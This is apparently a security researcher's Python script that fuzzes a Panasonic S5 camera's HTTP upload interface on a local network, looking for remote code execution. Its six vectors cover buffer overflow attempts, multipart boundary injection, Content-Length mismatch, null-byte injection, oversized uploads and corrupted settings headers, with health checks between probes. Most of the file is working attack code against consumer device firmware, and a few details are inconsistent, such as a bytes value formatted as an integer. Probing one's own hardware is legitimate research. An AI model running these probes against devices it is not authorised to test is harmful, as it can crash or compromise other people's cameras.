#!/usr/bin/env python3
"""
rce_probe.py — Targeted RCE vector probes on the S5 camera.

Vectors:
  A. camsetting upload overflow (fixed 65533-byte buffer)
  B. Multipart boundary injection in data
  C. Content-Length mismatch (body > declared)
  D. Null byte injection in upload data
  E. HTTP body truncation (declared > actual)
  F. Oversized camsetting blob
  G. camsetting with corrupted header

Safety: AC power, no valid firmware data sent. Each probe is short (<10s).
If the camera goes down, we stop and wait for recovery.
"""
import socket
import struct
import threading
import time
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from common import KA, Net, parse_camrply, UA

IP = "192.168.1.131"
PORT = 80
CAMSETTING_SIZE = 65533

def log(msg):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), msg), flush=True)

def health(timeout=5):
    try:
        ka = KA(IP, port=PORT, timeout=timeout)
        st, _, body, dt = ka.request("GET", "/cam.cgi?mode=getstate")
        r = parse_camrply(body).get("result", "?")
        ka.close()
        return r
    except:
        return "OFFLINE"

def wait_ok(max_wait=120):
    start = time.time()
    while time.time() - start < max_wait:
        r = health(timeout=5)
        if r.lower() == "ok":
            return True
        time.sleep(5)
    return False

def download_camsetting():
    """Download the current camera settings blob."""
    ka = KA(IP, port=PORT, timeout=15)
    st, hdrs, body, dt = ka.request("GET", "/cam.cgi?mode=getinfo&type=camsetting")
    ka.close()
    if st == 200 and len(body) > 100:
        return body
    return None

def upload_camsetting(ka, data, log_tag=""):
    """Upload a camsetting blob via the multipart senddata path."""
    boundary = "=====RCE"
    body_m = ("--%s\r\n"
              'Content-Disposition: form-data; name="filename"; filename="send"\r\n'
              "Content-Type: application/octet-stream\r\n"
              "Content-Length: %d\r\n\r\n" % (boundary, len(data)))
    body_m = body_m.encode() + data + b"--%s--" % boundary.encode()
    req = ("POST /cam.cgi?mode=senddata HTTP/1.1\r\n"
           "Host: %s\r\n"
           "User-Agent: LUMIX Sync\r\n"
           "Content-Type: multipart/form-data; boundary=%s\r\n"
           "Content-Length: %d\r\n\r\n" % (IP, boundary, len(body_m)))
    req_bytes = req.encode() + body_m
    st, hdrs, body, dt = ka.send(req_bytes)
    r = parse_camrply(body).get("result", "?") if body else "no_resp"
    log("  [%s] upload %d bytes -> %s (%.0fms)" % (log_tag, len(data), r, dt*1000))
    return r

def vecA_camsetting_overflow():
    """Vector A: Upload camsetting blobs of increasing size.
    The camera allocates a 65533-byte buffer. If we send more,
    we might overflow it."""
    log("\n" + "="*60)
    log("VEC A: camsetting buffer overflow")
    log("="*60)

    blob = download_camsetting()
    if not blob:
        log("  Cannot download camsetting. Aborting.")
        return
    log("  Downloaded camsetting: %d bytes" % len(blob))

    # Test sizes: exact, +1, +16, +256, +4096
    test_sizes = [
        (CAMSETTING_SIZE, "exact (65533)"),
        (CAMSETTING_SIZE + 1, "+1"),
        (CAMSETTING_SIZE + 16, "+16"),
        (CAMSETTING_SIZE + 256, "+256"),
        (CAMSETTING_SIZE + 4096, "+4096"),
        (65536, "64KB (65536)"),
        (65537, "64KB+1"),
        (131072, "128KB"),
    ]

    for size, desc in test_sizes:
        try:
            ka = KA(IP, port=PORT, timeout=15)
            # Start camsetting upload session
            st, _, body, dt = ka.request("GET", "/cam.cgi?mode=startsenddata&type=camsetting&value=%d" % size)
            r = parse_camrply(body).get("result", "?")
            log("  [%s] startsenddata camsetting size=%d: %s" % (desc, size, r))

            if r.lower() == "ok":
                # Build the blob (pad with 0xAA if smaller than target)
                if size <= len(blob):
                    data = blob[:size]
                else:
                    data = blob + b"\xAA" * (size - len(blob))
                upload_camsetting(ka, data, desc)
                # End the session
                st, _, body, dt = ka.request("GET", "/cam.cgi?mode=endsenddata")
                log("  [%s] end: %s" % (desc, parse_camrply(body).get("result", "?")))
            ka.close()
        except Exception as e:
            log("  [%s] EXC: %s: %s" % (desc, type(e).__name__, e))

        # Health check after each
        time.sleep(2)
        r = health(timeout=5)
        if r.lower() != "ok":
            log("  !! After [%s]: camera not ok: %s" % (desc, r))
            if not wait_ok(90):
                log("  !! Camera not recovering. STOP.")
                return

def vecB_boundary_injection():
    """Vector B: Put the multipart boundary string INSIDE the data.
    If the parser doesn't properly handle boundaries in data, it might
    truncate the data early and leave the rest in a buffer."""
    log("\n" + "="*60)
    log("VEC B: Multipart boundary injection in data")
    log("="*60)

    blob = download_camsetting()
    if not blob:
        log("  Cannot download camsetting. Aborting.")
        return

    # Use a known boundary and inject it into the data
    boundary = "=====INJECT"
    # Create data with the boundary in the middle
    half = len(blob) // 2
    data_with_boundary = blob[:half] + boundary.encode() + b"\r\n" + blob[half:]

    try:
        ka = KA(IP, port=PORT, timeout=15)
        st, _, body, dt = ka.request("GET", "/cam.cgi?mode=startsenddata&type=camsetting&value=%d" % len(blob))
        r = parse_camrply(body).get("result", "?")
        log("  start: %s" % r)

        if r.lower() == "ok":
            # Send data with boundary injected
            body_m = ("--%s\r\n"
                      'Content-Disposition: form-data; name="filename"; filename="send"\r\n'
                      "Content-Type: application/octet-stream\r\n"
                      "Content-Length: %d\r\n\r\n" % (boundary, len(data_with_boundary)))
            body_m = body_m.encode() + data_with_boundary + b"--%s--" % boundary.encode()
            req = ("POST /cam.cgi?mode=senddata HTTP/1.1\r\n"
                   "Host: %s\r\n"
                   "User-Agent: LUMIX Sync\r\n"
                   "Content-Type: multipart/form-data; boundary=%s\r\n"
                   "Content-Length: %d\r\n\r\n" % (IP, boundary, len(body_m)))
            st, _, body, dt = ka.send(req.encode() + body_m)
            log("  boundary-injected upload: %s (%.0fms)" % (
                parse_camrply(body).get("result", "?"), dt*1000))

            st, _, body, dt = ka.request("GET", "/cam.cgi?mode=endsenddata")
            log("  end: %s" % parse_camrply(body).get("result", "?"))
        ka.close()
    except Exception as e:
        log("  EXC: %s: %s" % (type(e).__name__, e))

    time.sleep(2)
    r = health(timeout=5)
    log("  [health] %s" % r)
    if r.lower() != "ok" and not wait_ok(90):
        log("  !! Not recovering. STOP.")

def vecC_content_length_mismatch():
    """Vector C: Send a body LARGER than the declared Content-Length.
    The HTTP server reads Content-Length bytes, but the extra bytes
    remain in the TCP buffer. If the next request is parsed from
    those extra bytes, we get a parse confusion."""
    log("\n" + "="*60)
    log("VEC C: Content-Length mismatch (body > declared)")
    log("="*60)

    blob = download_camsetting()
    if not blob:
        log("  Cannot download camsetting. Aborting.")
        return

    # Use a small chunk to keep it simple
    chunk = blob[:1000]
    boundary = "=====CLM"

    # Declare Content-Length as 1000 but send 1001 bytes
    body_declared = 1000
    body_actual = chunk + b"X"  # 1001 bytes

    body_m = ("--%s\r\n"
              'Content-Disposition: form-data; name="filename"; filename="send"\r\n'
              "Content-Type: application/octet-stream\r\n"
              "Content-Length: %d\r\n\r\n" % (boundary, body_actual))
    body_m = body_m.encode() + body_actual + b"--%s--" % boundary.encode()

    # Declare the total as if body was 1000, but actually it's 1001
    total_declared = len(body_m) - 1  # one byte short
    req = ("POST /cam.cgi?mode=senddata HTTP/1.1\r\n"
           "Host: %s\r\n"
           "User-Agent: LUMIX Sync\r\n"
           "Content-Type: multipart/form-data; boundary=%s\r\n"
           "Content-Length: %d\r\n\r\n" % (IP, boundary, total_declared))
    # But send the FULL body (one byte more than declared)
    req_bytes = req.encode() + body_m

    try:
        ka = KA(IP, port=PORT, timeout=15)
        st, _, body, dt = ka.request("GET", "/cam.cgi?mode=startsenddata&type=camsetting&value=%d" % len(blob))
        r = parse_camrply(body).get("result", "?")
        log("  start: %s" % r)

        if r.lower() == "ok":
            # Send with mismatched Content-Length
            s = socket.create_connection((IP, PORT), timeout=10)
            s.settimeout(10)
            s.sendall(req_bytes)
            resp = b""
            while True:
                try:
                    c = s.recv(65536)
                    if not c:
                        break
                    resp += c
                except:
                    break
            s.close()
            log("  CL-mismatch: %d bytes back: %.80s" % (len(resp), resp[:80]))

            st, _, body, dt = ka.request("GET", "/cam.cgi?mode=endsenddata")
            log("  end: %s" % parse_camrply(body).get("result", "?"))
        ka.close()
    except Exception as e:
        log("  EXC: %s: %s" % (type(e).__name__, e))

    time.sleep(2)
    r = health(timeout=5)
    log("  [health] %s" % r)
    if r.lower() != "ok" and not wait_ok(90):
        log("  !! Not recovering. STOP.")

def vecD_null_byte_injection():
    """Vector D: Inject null bytes at specific positions in the upload data.
    If the camera uses string functions (strlen, strcpy) on the data,
    null bytes might truncate the string and leave the rest of the
    buffer uninitialized or cause a read past the string end."""
    log("\n" + "="*60)
    log("VEC D: Null byte injection in upload data")
    log("="*60)

    blob = download_camsetting()
    if not blob:
        log("  Cannot download camsetting. Aborting.")
        return

    # Try null bytes at various positions
    positions = [0, 1, 10, 100, 1000, 10000, 30000, 60000, 65000, 65532]

    for pos in positions:
        if pos >= len(blob):
            continue
        try:
            ka = KA(IP, port=PORT, timeout=15)
            st, _, body, dt = ka.request("GET", "/cam.cgi?mode=startsenddata&type=camsetting&value=%d" % len(blob))
            r = parse_camrply(body).get("result", "?")

            if r.lower() == "ok":
                # Inject null byte
                data = bytearray(blob)
                data[pos] = 0x00
                upload_camsetting(ka, bytes(data), "null@%d" % pos)
                st, _, body, dt = ka.request("GET", "/cam.cgi?mode=endsenddata")
            ka.close()
        except Exception as e:
            log("  [null@%d] EXC: %s" % (pos, type(e).__name__))

        time.sleep(1)
        r = health(timeout=5)
        if r.lower() != "ok":
            log("  !! After null@%d: camera not ok: %s" % (pos, r))
            if not wait_ok(90):
                log("  !! Not recovering. STOP.")
                return

def vecE_oversized_camsetting():
    """Vector E: Start a camsetting upload with a LARGER declared size,
    then send data of that size. The camera might allocate a buffer
    based on the declared size, and if the actual processing assumes
    the normal 65533 size, we get an overflow."""
    log("\n" + "="*60)
    log("VEC E: Oversized camsetting (declare big, send big)")
    log("="*60)

    blob = download_camsetting()
    if not blob:
        log("  Cannot download camsetting. Aborting.")
        return

    # Try sizes: 65533*2, 65533*4, 256KB
    for size in [131066, 262144, 262144]:
        try:
            ka = KA(IP, port=PORT, timeout=15)
            st, _, body, dt = ka.request("GET", "/cam.cgi?mode=startsenddata&type=camsetting&value=%d" % size)
            r = parse_camrply(body).get("result", "?")
            log("  start size=%d: %s" % (size, r))

            if r.lower() == "ok":
                # Send a blob of the declared size (pad with 0xBB)
                data = blob + b"\xBB" * (size - len(blob))
                upload_camsetting(ka, data, "size=%d" % size)
                st, _, body, dt = ka.request("GET", "/cam.cgi?mode=endsenddata")
                log("  end: %s" % parse_camrply(body).get("result", "?"))
            ka.close()
        except Exception as e:
            log("  [size=%d] EXC: %s: %s" % (size, type(e).__name__, e))

        time.sleep(2)
        r = health(timeout=5)
        if r.lower() != "ok":
            log("  !! After size=%d: %s" % (size, r))
            if not wait_ok(90):
                log("  !! Not recovering. STOP.")
                return

def vecF_corrupted_header():
    """Vector F: Send a camsetting blob with a corrupted header.
    If the camera validates the header and the validation logic has
    a bug, we might trigger an out-of-bounds read."""
    log("\n" + "="*60)
    log("VEC F: Corrupted camsetting header")
    log("="*60)

    blob = download_camsetting()
    if not blob:
        log("  Cannot download camsetting. Aborting.")
        return

    # Corrupt different parts of the header
    tests = [
        ("null magic", blob[:4].replace(b"Panasonic", b"\x00\x00\x00\x00") + blob[4:]),
        ("huge model", b"\xFF" * 32 + blob[32:]),
        ("version overflow", blob[:16] + struct.pack("<I", 0xFFFFFFFF) + blob[20:]),
        ("size field = 0", blob[:16] + struct.pack("<I", 0) + blob[20:]),
        ("size field = 0xFFFFFFFF", blob[:16] + struct.pack("<I", 0xFFFFFFFF) + blob[20:]),
    ]

    for name, data in tests:
        try:
            ka = KA(IP, port=PORT, timeout=15)
            st, _, body, dt = ka.request("GET", "/cam.cgi?mode=startsenddata&type=camsetting&value=%d" % len(data))
            r = parse_camrply(body).get("result", "?")

            if r.lower() == "ok":
                upload_camsetting(ka, data, name)
                st, _, body, dt = ka.request("GET", "/cam.cgi?mode=endsenddata")
            else:
                log("  [%s] start rejected: %s" % (name, r))
            ka.close()
        except Exception as e:
            log("  [%s] EXC: %s" % (name, type(e).__name__))

        time.sleep(1)
        r = health(timeout=5)
        if r.lower() != "ok":
            log("  !! After [%s]: %s" % (name, r))
            if not wait_ok(90):
                log("  !! Not recovering. STOP.")
                return

def main():
    log("S5 Camera RCE Probe - Code injection vectors")
    log("Target: %s" % IP)
    log("AC power required. No valid firmware data sent.")
    log("")

    if not wait_ok(60):
        log("Camera not ready. Aborting.")
        return
    log("Camera ready.")

    vectors = [
        ("A", vecA_camsetting_overflow, "camsetting overflow"),
        ("B", vecB_boundary_injection, "boundary injection"),
        ("C", vecC_content_length_mismatch, "CL mismatch"),
        ("D", vecD_null_byte_injection, "null byte injection"),
        ("E", vecE_oversized_camsetting, "oversized camsetting"),
        ("F", vecF_corrupted_header, "corrupted header"),
    ]
    only = sys.argv[1:]

    for vid, func, name in vectors:
        if only and vid not in only:
            continue
        log("\n>>> VEC %s: %s" % (vid, name))
        try:
            func()
        except Exception as e:
            log("  VEC %s EXCEPTION: %s: %s" % (vid, type(e).__name__, e))

        # Post-vector health
        time.sleep(3)
        r = health(timeout=5)
        if r.lower() == "ok":
            log("  [post-%s] OK" % vid)
        else:
            log("  [post-%s] NOT OK: %s" % (vid, r))
            if not wait_ok(120):
                log("  !! Camera not recovering. STOP.")
                return

    log("\n" + "="*60)
    log("ALL VECTORS COMPLETE")
    log("="*60)
    r = health(timeout=5)
    log("Final: %s" % r)

if __name__ == "__main__":
    main()
